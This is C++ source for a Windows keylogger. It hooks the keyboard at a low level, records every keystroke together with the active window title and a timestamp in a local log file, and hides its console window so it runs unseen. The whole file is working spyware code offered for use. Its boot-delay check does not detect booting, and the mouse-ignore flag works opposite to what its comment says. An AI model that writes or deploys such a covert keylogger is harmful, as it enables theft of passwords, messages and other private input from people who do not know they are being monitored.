#define UNICODE
#include <Windows.h>
#include <cstring>
#include <cstdio>
#include <fstream>
#include <iostream>
#include <sstream>
#include <time.h>
#include <map>

// Configuration settings
#define INVISIBLE  // Set to either INVISIBLE or VISIBLE for window visibility
#define BOOTWAIT   // Set to either BOOTWAIT or NOWAIT to control boot delay behavior
#define FORMAT 0   // 0 = Default, 10 = Decimal, 16 = Hexadecimal
#define MOUSEIGNORE // Set to ignore mouse clicks

// Global variables
HHOOK _hook; // Hook handle
KBDLLHOOKSTRUCT kbdStruct; // Key event data
std::ofstream output_file; // Output file stream for logging

// Key mappings for FORMAT 0 (default)
#if FORMAT == 0
const std::map<int, std::string> keyname{
    {VK_BACK, "[BACKSPACE]"},
    {VK_RETURN, "\n"},
    {VK_SPACE, "_"},
    {VK_TAB, "[TAB]"},
    {VK_SHIFT, "[SHIFT]"},
    {VK_LSHIFT, "[LSHIFT]"},
    {VK_RSHIFT, "[RSHIFT]"},
    {VK_CONTROL, "[CONTROL]"},
    {VK_LCONTROL, "[LCONTROL]"},
    {VK_RCONTROL, "[RCONTROL]"},
    {VK_MENU, "[ALT]"},
    {VK_LWIN, "[LWIN]"},
    {VK_RWIN, "[RWIN]"},
    {VK_ESCAPE, "[ESCAPE]"},
    {VK_END, "[END]"},
    {VK_HOME, "[HOME]"},
    {VK_LEFT, "[LEFT]"},
    {VK_RIGHT, "[RIGHT]"},
    {VK_UP, "[UP]"},
    {VK_DOWN, "[DOWN]"},
    {VK_PRIOR, "[PG_UP]"},
    {VK_NEXT, "[PG_DOWN]"},
    {VK_OEM_PERIOD, "."},
    {VK_DECIMAL, "."},
    {VK_OEM_PLUS, "+"},
    {VK_OEM_MINUS, "-"},
    {VK_ADD, "+"},
    {VK_SUBTRACT, "-"},
    {VK_CAPITAL, "[CAPSLOCK]"}
};
#endif

// Function prototypes
void SetHook();
void ReleaseHook();
void Stealth();
bool IsSystemBooting();
int Save(int key_stroke);
LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam);

// Hook callback function
LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode >= 0 && wParam == WM_KEYDOWN) {
        kbdStruct = *((KBDLLHOOKSTRUCT*)lParam); // Capture the key event
        Save(kbdStruct.vkCode); // Save the key press
    }
    return CallNextHookEx(_hook, nCode, wParam, lParam); // Pass the hook event to the next hook
}

// Function to set the keyboard hook
void SetHook()
{
    if (!(_hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0))) {
        MessageBox(NULL, L"Failed to install hook!", L"Error", MB_ICONERROR);
    }
}

// Function to release the hook
void ReleaseHook()
{
    UnhookWindowsHookEx(_hook);
}

// Function to save the key stroke into the log file
int Save(int key_stroke)
{
    std::stringstream output;
    static char lastwindow[256] = ""; // Track the last active window

#ifndef MOUSEIGNORE
    // Ignore mouse clicks (1 and 2 correspond to mouse events)
    if (key_stroke == 1 || key_stroke == 2) {
        return 0;
    }
#endif

    HWND foreground = GetForegroundWindow();
    DWORD threadID;
    HKL layout = NULL;

    if (foreground) {
        // Get the keyboard layout of the active window
        threadID = GetWindowThreadProcessId(foreground, NULL);
        layout = GetKeyboardLayout(threadID);
    }

    if (foreground) {
        char window_title[256];
        GetWindowTextA(foreground, window_title, 256);

        if (strcmp(window_title, lastwindow) != 0) {
            strcpy_s(lastwindow, sizeof(lastwindow), window_title);
            // Log the window title and timestamp
            struct tm tm_info;
            time_t t = time(NULL);
            localtime_s(&tm_info, &t);
            char s[64];
            strftime(s, sizeof(s), "%FT%X%z", &tm_info);
            output << "\n\n[Window: " << window_title << " - at " << s << "] ";
        }
    }

    // Format key stroke based on configuration
#if FORMAT == 10
    output << '[' << key_stroke << ']'; // Decimal format
#elif FORMAT == 16
    output << std::hex << "[" << key_stroke << ']'; // Hexadecimal format
#else
    if (keyname.find(key_stroke) != keyname.end()) {
        output << keyname.at(key_stroke); // Predefined key names
    }
    else {
        char key;
        bool lowercase = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0); // Caps lock state

        // Check for shift key
        if ((GetKeyState(VK_SHIFT) & 0x1000) != 0 ||
            (GetKeyState(VK_LSHIFT) & 0x1000) != 0 ||
            (GetKeyState(VK_RSHIFT) & 0x1000) != 0) {
            lowercase = !lowercase;
        }

        // Map virtual key to character
        key = MapVirtualKeyExA(key_stroke, MAPVK_VK_TO_CHAR, layout);

        // Convert to lowercase if necessary
        if (!lowercase) {
            key = tolower(key);
        }
        output << char(key);
    }
#endif

    // Log to file and console
    output_file << output.str();
    output_file.flush();
    std::cout << output.str();

    return 0;
}

// Function to hide or show the console window
void Stealth()
{
#ifdef VISIBLE
    ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 1); // Show the console
#endif

#ifdef INVISIBLE
    ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0); // Hide the console
    FreeConsole(); // Detach the process from the console window
#endif
}

// Function to check if the system is still booting
bool IsSystemBooting()
{
    return GetSystemMetrics(SM_SYSTEMDOCKED) != 0;
}

// Main function
int main()
{
    // Set the visibility of the console window
    Stealth();

    // Handle system boot delay
#ifdef BOOTWAIT
    while (IsSystemBooting()) {
        std::cout << "System is still booting up. Waiting 10 seconds to check again...\n";
        Sleep(10000); // Wait for 10 seconds
    }
#endif

#ifdef NOWAIT
    std::cout << "Skipping boot metrics check.\n";
#endif

    // Open the output log file
    const char* output_filename = "keylogger.log";
    std::cout << "Logging output to " << output_filename << std::endl;
    output_file.open(output_filename, std::ios_base::app);

    // Set the keyboard hook
    SetHook();

    // Run the message loop to keep the application active
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {}

    return 0;
}
